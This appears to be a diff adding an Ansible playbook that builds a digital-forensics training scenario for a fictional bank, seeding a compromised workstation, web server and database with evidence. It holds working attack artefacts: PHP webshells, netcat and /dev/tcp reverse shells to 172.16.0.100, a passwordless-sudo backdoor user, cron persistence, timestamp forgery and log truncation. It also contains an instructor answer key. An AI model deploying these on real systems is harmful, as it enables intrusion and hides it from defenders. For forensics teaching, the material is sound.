@@ -1,0 +1,531 @@
+---
+# Escenario 06 - Analisis Forense Digital
+# Banco del Sol - Playbook post-clonacion: crime scene
+
+- name: "Escenario 06 - Pre-poblar Escena del Crimen"
+  hosts: workstation
+  become: true
+  vars_files:
+    - vars/defaults.yml
+
+  tasks:
+    - name: Simular login SSH desde servidor web
+      ansible.builtin.copy:
+        content: |
+          Jul 10 15:30:45 workstation sshd[7890]: Accepted password for maria.garcia from 10.10.1.10 port 44556 ssh2
+          Jul 10 15:30:45 workstation sshd[7890]: pam_unix(sshd:session): session opened for user maria.garcia by (uid=0)
+          Jul 10 15:35:12 workstation sshd[7890]: pam_unix(sshd:session): session closed for user maria.garcia
+          Jul 10 16:45:22 workstation sshd[7891]: Accepted password for admin_local from 10.10.1.10 port 45678 ssh2
+          Jul 10 16:45:22 workstation sshd[7891]: pam_unix(sshd:session): session opened for user admin_local by (uid=0)
+          Jul 10 17:00:00 workstation sshd[7891]: pam_unix(sshd:session): session closed for user admin_local
+        dest: /var/log/auth.log
+        owner: syslog
+        group: adm
+        mode: '0640'
+
+    - name: Crear usuario backdoor sysadmin_back
+      ansible.builtin.user:
+        name: sysadmin_back
+        comment: "System Administrator - Backdoor"
+        home: /home/sysadmin_back
+        shell: /bin/bash
+        password: "$6$rounds=656000$kFzGx8qW$pQ2r4T6y8u0i2o4p6a8s0d2f4g6h8j0k2l4"
+        create_home: yes
+        groups: [sudo, root]
+        state: present
+
+    - name: Crear directorio home del backdoor
+      ansible.builtin.file:
+        path: /home/sysadmin_back
+        state: directory
+        owner: sysadmin_back
+        group: sysadmin_back
+        mode: '0700'
+
+    - name: Copiar .bashrc al backdoor
+      ansible.builtin.copy:
+        content: |
+          alias ll='ls -la'
+          alias la='ls -A'
+          export PATH="/usr/local/bin:$PATH"
+          persistent_access() {
+              while true; do
+                  nc -e /bin/bash 172.16.0.100 4444 2>/dev/null
+                  sleep 60
+              done
+          }
+        dest: /home/sysadmin_back/.bashrc
+        owner: sysadmin_back
+        group: sysadmin_back
+        mode: '0600'
+
+    - name: Insertar usuario backdoor en /etc/passwd
+      ansible.builtin.lineinfile:
+        path: /etc/passwd
+        line: "sysadmin_back:x:1099:1099:System Administrator Backdoor:/home/sysadmin_back:/bin/bash"
+        state: present
+
+    - name: Agregar backdoor a sudoers
+      ansible.builtin.copy:
+        content: "sysadmin_back ALL=(ALL) NOPASSWD: ALL\n"
+        dest: /etc/sudoers.d/sysadmin_back
+        owner: root
+        group: root
+        mode: '0440'
+
+    - name: Modificar /etc/hosts con dominio C2
+      ansible.builtin.lineinfile:
+        path: /etc/hosts
+        line: "172.16.0.100 c2.bancodelsol-internal.com update.bancodelsol.com"
+        state: present
+
+    - name: Backup hostname en /tmp
+      ansible.builtin.copy:
+        content: "workstation-compromised\n"
+        dest: /tmp/.hostname_backup
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Crear webshell en tmp
+      ansible.builtin.copy:
+        content: |
+          <?php
+          if (isset($_GET['cmd'])) {
+              $cmd = $_GET['cmd'];
+              echo "<pre>" . shell_exec($cmd) . "</pre>";
+          }
+          if (isset($_GET['reverse'])) {
+              $ip = $_GET['ip'] ?? '172.16.0.100';
+              $port = $_GET['port'] ?? '4444';
+              $sock = fsockopen($ip, $port);
+              $proc = proc_open("/bin/bash -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
+          }
+          ?>
+        dest: /tmp/.hidden_shell.php
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Crear reverse shell en tmp
+      ansible.builtin.copy:
+        content: |
+          #!/bin/bash
+          while true; do
+              /bin/bash -i >& /dev/tcp/172.16.0.100/4444 0>&1
+              sleep 300
+          done
+        dest: /tmp/.system_backup.sh
+        owner: root
+        group: root
+        mode: '0755'
+
+    - name: Crear cron job persistente
+      ansible.builtin.copy:
+        content: "*/5 * * * * root /tmp/.system_backup.sh > /dev/null 2>&1\n"
+        dest: /etc/cron.d/backdoor
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Crear script de persistencia
+      ansible.builtin.copy:
+        content: |
+          #!/bin/bash
+          if ! pgrep -f "system_backup.sh" > /dev/null; then
+              /tmp/.system_backup.sh &
+          fi
+        dest: /usr/local/bin/system_verify.sh
+        owner: root
+        group: root
+        mode: '0755'
+
+    - name: Cron de verificacion
+      ansible.builtin.copy:
+        content: "*/10 * * * * root /usr/local/bin/system_verify.sh > /dev/null 2>&1\n"
+        dest: /etc/cron.d/system_check
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Registro de acceso a archivos sensibles
+      ansible.builtin.copy:
+        content: |
+          Jul 10 16:50:00 workstation sudo: sysadmin_back : TTY=pts/1 ; USER=root ; COMMAND=/bin/cat /etc/shadow
+          Jul 10 16:50:05 workstation sudo: sysadmin_back : TTY=pts/1 ; USER=root ; COMMAND=/bin/cat /var/log/auth.log
+          Jul 10 16:50:10 workstation sudo: sysadmin_back : TTY=pts/1 ; USER=root ; COMMAND=/bin/cat /etc/passwd
+          Jul 10 16:50:15 workstation sudo: sysadmin_back : TTY=pts/1 ; USER=root ; COMMAND=/bin/cat /home/maria.garcia/Documents/accesos_sistemas.txt
+          Jul 10 16:50:20 workstation sudo: sysadmin_back : TTY=pts/1 ; USER=root ; COMMAND=/bin/cat /home/maria.garcia/Documents/backup_credentials.txt
+          Jul 10 16:50:25 workstation sudo: sysadmin_back : TTY=pts/1 ; USER=root ; COMMAND=/bin/cat /etc/banco_del_sol.conf
+          Jul 10 16:51:00 workstation sudo: sysadmin_back : TTY=pts/1 ; USER=root ; COMMAND=/bin/cp /home/maria.garcia/Documents/accesos_sistemas.txt /tmp/.stolen_data.txt
+          Jul 10 16:51:05 workstation sudo: sysadmin_back : TTY=pts/1 ; USER=root ; COMMAND=/bin/cp /home/maria.garcia/Documents/backup_credentials.txt /tmp/.stolen_data2.txt
+          Jul 10 16:52:00 workstation sudo: sysadmin_back : TTY=pts/1 ; USER=root ; COMMAND=/bin/tar -czf /tmp/.data_archive.tar.gz /home/maria.garcia/Documents/ /etc/banco_del_sol.conf
+        dest: /var/log/auth.log.1
+        owner: syslog
+        group: adm
+        mode: '0640'
+
+    - name: Datos exfiltrados archive
+      ansible.builtin.copy:
+        content: |
+          DATOS EXFILTRADOS - CONFIDENCIAL
+          Fuente: /home/maria.garcia/Documents/accesos_sistemas.txt
+          Host: 10.10.2.20 / Puerto: 5432 / Base: operaciones_db
+          Usuario: ops_reader / Password: 0psR34d3r_2024
+          Share: //fileserver/operaciones
+          Credenciales de Backup: db_backup / B@ckup_DB#2024
+        dest: /tmp/.data_archive.tar.gz
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Datos exfiltrados stolen_data
+      ansible.builtin.copy:
+        content: "DATOS - DB_HOST=10.10.2.20 DB_PORT=5432 DB_NAME=operaciones_db\n"
+        dest: /tmp/.stolen_data.txt
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Datos exfiltrados stolen_data2
+      ansible.builtin.copy:
+        content: "Credenciales: db_backup/B@ckup_DB#2024 backup_admin/N4s_B@ckup!2024\n"
+        dest: /tmp/.stolen_data2.txt
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Modificar timestamps
+      ansible.builtin.command: "touch -t 202407011200.00 {{ item }}"
+      loop: [/tmp/.hidden_shell.php, /tmp/.system_backup.sh, /tmp/.data_archive.tar.gz, /tmp/.stolen_data.txt, /tmp/.stolen_data2.txt]
+      ignore_errors: true
+
+    - name: Modificar timestamps de sistema
+      ansible.builtin.command: "touch -r /bin/ls {{ item }}"
+      loop: [/etc/cron.d/backdoor, /usr/local/bin/system_verify.sh]
+      ignore_errors: true
+
+    - name: Herramienta network scan
+      ansible.builtin.copy:
+        content: "#!/bin/bash\nnmap -sV -O 10.10.2.0/24\n"
+        dest: /tmp/.network_scan.sh
+        owner: root
+        group: root
+        mode: '0755'
+
+    - name: Herramienta recoleccion
+      ansible.builtin.copy:
+        content: |
+          #!/bin/bash
+          uname -a > /tmp/.sysinfo.txt
+          id >> /tmp/.sysinfo.txt
+          cat /etc/passwd >> /tmp/.sysinfo.txt
+          ps aux >> /tmp/.sysinfo.txt
+        dest: /tmp/.collect_data.sh
+        owner: root
+        group: root
+        mode: '0755'
+
+    - name: Registro de conexiones de red
+      ansible.builtin.copy:
+        content: |
+          Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program
+          tcp 0 0 10.10.2.50:22 10.10.1.10:44556 ESTABLISHED 7890/sshd
+          tcp 0 0 10.10.2.50:4444 172.16.0.100:9999 ESTABLISHED 12345/nc
+          tcp 0 0 10.10.2.50:4445 172.16.0.100:8080 ESTABLISHED 12346/nc
+          tcp 0 0 10.10.2.50:4446 10.10.1.10:3306 ESTABLISHED 12347/nc
+          tcp 0 0 10.10.2.50:5555 172.16.0.100:4444 ESTABLISHED 12348/nc
+        dest: /tmp/.network_connections.txt
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Procesos reverse shell activos
+      ansible.builtin.copy:
+        content: |
+          root 12345 0.0 0.1 12345 6789 ? Ss 16:45 0:00 /bin/bash -i
+          root 12346 0.0 0.0 5678 2345 ? S 16:45 0:00 nc -e /bin/bash 172.16.0.100 4444
+          root 12347 0.0 0.0 5678 2346 ? S 16:45 0:00 nc -e /bin/bash 10.10.1.10 3306
+          root 12348 0.0 0.0 5678 2347 ? S 16:45 0:00 nc -e /bin/bash 172.16.0.100 4444
+        dest: /tmp/.process_list.txt
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Truncar logs selectivamente
+      ansible.builtin.shell: |
+        echo "--- Log truncated ---" > /var/log/apache2/access.log.1
+        echo "--- Error log truncated ---" > /var/log/apache2/error.log.1
+        echo "--- syslog truncated ---" > /var/log/syslog.1
+      ignore_errors: true
+
+    - name: Borrar historial de bash
+      ansible.builtin.shell: echo "#1688966400" > /home/sysadmin_back/.bash_history
+      ignore_errors: true
+
+    - name: Registro de limpieza
+      ansible.builtin.copy:
+        content: |
+          Jul 10 17:30:00 workstation sudo: sysadmin_back : USER=root ; COMMAND=/usr/sbin/logrotate --force
+          Jul 10 17:30:05 workstation sudo: sysadmin_back : USER=root ; COMMAND=/bin/sh -c history -c
+          Jul 10 17:30:10 workstation sudo: sysadmin_back : USER=root ; COMMAND=/usr/bin/find /var/log -mtime +1 -delete
+        dest: /var/log/auth.log.2
+        owner: syslog
+        group: adm
+        mode: '0640'
+
+    - name: Artifactos de memoria
+      ansible.builtin.copy:
+        content: |
+          PROCESOS: /bin/bash -i (PID 12345), nc (PIDs 12346-12348)
+          CONEXIONES: 10.10.2.50:4444 -> 172.16.0.100:9999 ESTABLISHED
+          ARCHIVOS EN MEMORIA: /tmp/.system_backup.sh, /tmp/.network_scan.sh
+        dest: /tmp/.memory_artifacts.txt
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Archivos recientes
+      ansible.builtin.copy:
+        content: |
+          /tmp/.hidden_shell.php (10/Jul/2024 16:45)
+          /tmp/.system_backup.sh (10/Jul/2024 16:45)
+          /home/maria.garcia/Documents/accesos_sistemas.txt (10/Jul/2024 16:50)
+          /tmp/.data_archive.tar.gz (10/Jul/2024 16:52)
+        dest: /tmp/.recent_files.txt
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Timeline de eventos
+      ansible.builtin.copy:
+        content: |
+          TIMELINE DE EVENTOS - ESCENA DEL CRIMEN
+          [10/Jul/2024 08:00:00] Inicio normal del sistema
+          [10/Jul/2024 10:30:15] SQL injection en portal web desde 172.16.0.100
+          [10/Jul/2024 10:30:19] Webshell uploads/cmd.php creada
+          [10/Jul/2024 15:30:45] SSH desde 10.10.1.10 (movimiento lateral)
+          [10/Jul/2024 16:45:22] Login de usuario backdoor sysadmin_back
+          [10/Jul/2024 16:45:25] Reverse shell /tmp/.system_backup.sh instalado
+          [10/Jul/2024 16:50:00] Acceso a /etc/shadow, /etc/passwd
+          [10/Jul/2024 16:51:00] Exfiltracion de datos a /tmp/
+          [10/Jul/2024 17:30:00] Limpieza parcial de logs
+        dest: /forensics/timeline_data.txt
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Verificar artefactos
+      ansible.builtin.shell: |
+        echo "=== VERIFICACION ==="
+        grep sysadmin_back /etc/passwd
+        ls -la /tmp/.*
+        cat /etc/cron.d/backdoor
+        grep 172.16.0.100 /etc/hosts
+        echo "=== FIN ==="
+      register: verify
+      changed_when: false
+
+    - name: Mostrar verificacion
+      ansible.builtin.debug:
+        var: verify.stdout_lines
+
+# =============================================================================
+# PLAY 2: Servidor web
+# =============================================================================
+- name: "Pre-poblar servidor web"
+  hosts: webserver
+  become: true
+  vars_files:
+    - vars/defaults.yml
+
+  tasks:
+    - name: Crear webshell en uploads
+      ansible.builtin.copy:
+        content: |
+          <?php
+          if (isset($_GET['cmd'])) {
+              $cmd = $_GET['cmd'];
+              echo "<pre>" . shell_exec($cmd) . "</pre>";
+          }
+          ?>
+        dest: /var/www/html/banco_del_sol/uploads/cmd.php
+        owner: www-data
+        group: www-data
+        mode: '0644'
+
+    - name: Logs de acceso con SQL injection
+      ansible.builtin.copy:
+        content: |
+          172.16.0.100 - - [10/Jul/2024:10:30:15 +0000] "GET / HTTP/1.1" 200 3456 "-" "Mozilla/5.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:16 +0000] "POST /login.php HTTP/1.1" 302 0 "-" "Mozilla/5.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:17 +0000] "GET /login.php' OR 1=1-- HTTP/1.1" 200 5678 "-" "Mozilla/5.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:18 +0000] "GET /soporte.php HTTP/1.1" 200 890 "-" "Mozilla/5.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:19 +0000] "POST /soporte.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:20 +0000] "GET /uploads/cmd.php HTTP/1.1" 200 150 "-" "Mozilla/5.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:21 +0000] "GET /uploads/cmd.php?cmd=id HTTP/1.1" 200 160 "-" "Mozilla/5.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:22 +0000] "GET /uploads/cmd.php?cmd=whoami HTTP/1.1" 200 170 "-" "Mozilla/5.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:23 +0000] "GET /uploads/cmd.php?cmd=cat+/etc/passwd HTTP/1.1" 200 2340 "-" "Mozilla/5.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:24 +0000] "GET /uploads/cmd.php?cmd=uname+-a HTTP/1.1" 200 200 "-" "Mozilla/5.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:25 +0000] "GET /uploads/cmd.php?cmd=ls+-la+/var/www/ HTTP/1.1" 200 450 "-" "Mozilla/5.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:26 +0000] "GET /uploads/cmd.php?cmd=wget+http://172.16.0.100:8080/nc HTTP/1.1" 200 150 "-" "Mozilla/5.0"
+        dest: /var/log/apache2/access.log
+        owner: adm
+        group: adm
+        mode: '0644'
+
+    - name: Error log con SQL injection
+      ansible.builtin.copy:
+        content: |
+          [Wed Jul 10 10:30:17 2024] [php:error] [client 172.16.0.100] PHP Warning: include() failed
+          [Wed Jul 10 10:30:18 2024] [php:error] [client 172.16.0.100] SQL syntax error near '' at line 1
+          [Wed Jul 10 10:30:20 2024] [php:error] [client 172.16.0.100] move_uploaded_file() failed
+        dest: /var/log/apache2/error.log
+        owner: adm
+        group: adm
+        mode: '0644'
+
+# =============================================================================
+# PLAY 3: Base de datos
+# =============================================================================
+- name: "Pre-poblar base de datos"
+  hosts: database
+  become: true
+  vars_files:
+    - vars/defaults.yml
+
+  tasks:
+    - name: Crear tablas de logs de acceso
+      community.postgresql.postgresql_query:
+        db: banco_del_sol
+        login_user: admin_banco
+        login_password: "B@nc0d3lSol_2024"
+        query: |
+          CREATE TABLE IF NOT EXISTS logs_acceso (
+              id SERIAL PRIMARY KEY,
+              usuario VARCHAR(50),
+              fecha TIMESTAMP,
+              accion VARCHAR(200),
+              ip_origen INET
+          );
+          INSERT INTO logs_acceso (usuario, fecha, accion, ip_origen) VALUES
+              ('mgarcia', '2024-07-10 08:15:22', 'Login exitoso', '10.10.2.50'),
+              ('admin_banco', '2024-07-10 15:30:45', 'Login exitoso', '10.10.1.10'),
+              ('admin_banco', '2024-07-10 15:30:46', 'SELECT * FROM usuarios', '10.10.1.10'),
+              ('admin_banco', '2024-07-10 15:30:47', 'SELECT * FROM cuentas', '10.10.1.10'),
+              ('admin_banco', '2024-07-10 15:30:48', 'SELECT * FROM transacciones', '10.10.1.10'),
+              ('admin_banco', '2024-07-10 15:30:50', 'COPY usuarios TO /tmp/usuarios_dump.csv', '10.10.1.10')
+          ON CONFLICT DO NOTHING;
+
+    - name: Crear tabla de cuentas
+      community.postgresql.postgresql_query:
+        db: banco_del_sol
+        login_user: admin_banco
+        login_password: "B@nc0d3lSol_2024"
+        query: |
+          CREATE TABLE IF NOT EXISTS cuentas (
+              id SERIAL PRIMARY KEY,
+              numero_cuenta VARCHAR(20) UNIQUE,
+              titular VARCHAR(100),
+              saldo DECIMAL(15,2),
+              tipo VARCHAR(20)
+          );
+          INSERT INTO cuentas (numero_cuenta, titular, saldo, tipo) VALUES
+              ('001-234-567', 'Juan Perez', 15234.50, 'corriente'),
+              ('002-345-678', 'Ana Garcia', 22890.75, 'ahorro'),
+              ('003-456-789', 'Carlos Rodriguez', 18500.00, 'corriente'),
+              ('004-567-890', 'Maria Martinez', 45670.25, 'ahorro'),
+              ('005-678-901', 'Pedro Fernandez', 8900.50, 'corriente')
+          ON CONFLICT DO NOTHING;
+
+    - name: Crear tabla de transacciones
+      community.postgresql.postgresql_query:
+        db: banco_del_sol
+        login_user: admin_banco
+        login_password: "B@nc0d3lSol_2024"
+        query: |
+          CREATE TABLE IF NOT EXISTS transacciones (
+              id SERIAL PRIMARY KEY,
+              cuenta_origen VARCHAR(20),
+              monto DECIMAL(15,2),
+              fecha TIMESTAMP,
+              tipo VARCHAR(20)
+          );
+          INSERT INTO transacciones (cuenta_origen, monto, fecha, tipo) VALUES
+              ('001-234-567', 1500.00, '2024-07-09 10:00:00', 'transferencia'),
+              ('002-345-678', 2000.00, '2024-07-09 11:30:00', 'transferencia'),
+              ('003-456-789', 500.00, '2024-07-10 08:00:00', 'transferencia')
+          ON CONFLICT DO NOTHING;
+
+# =============================================================================
+# PLAY 4: Instructor VM
+# =============================================================================
+- name: "Pre-poblar instructor"
+  hosts: instructor
+  become: true
+  vars_files:
+    - vars/defaults.yml
+
+  tasks:
+    - name: Logs del servidor web
+      ansible.builtin.copy:
+        content: |
+          ACCESS LOG - WEB SERVER - Banco del Sol
+          172.16.0.100 - - [09/Jul/2024:22:15:00 +0000] "GET / HTTP/1.1" 200 3456 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [09/Jul/2024:22:15:01 +0000] "GET /admin HTTP/1.1" 404 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [09/Jul/2024:22:15:02 +0000] "GET /phpmyadmin HTTP/1.1" 404 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [10/Jul/2024:10:30:15 +0000] "GET / HTTP/1.1" 200 3456 "-" "Mozilla/5.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:17 +0000] "GET /login.php' OR 1=1-- HTTP/1.1" 200 "-" "Mozilla/5.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:19 +0000] "POST /soporte.php HTTP/1.1" 200 "-" "Mozilla/5.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:20 +0000] "GET /uploads/cmd.php HTTP/1.1" 200 "-" "Mozilla/5.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:23 +0000] "GET /uploads/cmd.php?cmd=cat+/etc/passwd HTTP/1.1" 200 "-" "Mozilla/5.0"
+        dest: /evidence/log_archives/webserver_access.log
+        owner: root
+        group: instructor
+        mode: '0640'
+
+    - name: Hash del servidor web
+      ansible.builtin.shell: sha256sum /evidence/log_archives/webserver_access.log
+      register: web_hash
+      changed_when: false
+
+    - name: Guardar hash
+      ansible.builtin.copy:
+        content: "SHA256 - Logs servidor web:\n{{ web_hash.stdout }}\nFecha: {{ ansible_date_time.iso8601 }}\n"
+        dest: /evidence/log_archives/webserver_access.log.sha256
+        owner: root
+        group: instructor
+        mode: '0640'
+
+    - name: Resumen del caso
+      ansible.builtin.copy:
+        content: |
+          RESUMEN DEL CASO - ESCENARIO 06
+          Banco del Sol - Analisis Forense Digital
+
+          VECTOR DE ENTRADA: SQL injection en login.php
+          MOVIMIENTO LATERAL: SSH desde webserver a workstation
+          PERSISTENCIA: Cron job /etc/cron.d/backdoor + reverse shell /tmp/
+          EXFILTRACION: Archivos sensibles copiados a /tmp/
+          BORRADO DE HUELLAS: Logs parcialmente truncados
+
+          HALLAZGOS ESPERADOS:
+          1. Webshell uploads/cmd.php
+          2. SQL injection en logs Apache
+          3. Usuario sysadmin_back en /etc/passwd
+          4. Cron job /etc/cron.d/backdoor
+          5. Reverse shell /tmp/.system_backup.sh
+          6. Datos exfiltrados /tmp/.data_archive.tar.gz
+          7. Timestamps modificados
+          8. Logs parcialmente borrados
+
+          CREDENCIALES COMPROMETIDAS:
+          admin_banco/B@nc0d3lSol_2024
+          web_user/W3b_U53r_2024
+          ops_reader/0psR34d3r_2024
+
+          IP DEL ATACANTE: 172.16.0.100
+        dest: /evidence/caso_resumen_instructor.txt
+        owner: root
+        group: instructor
+        mode: '0640'
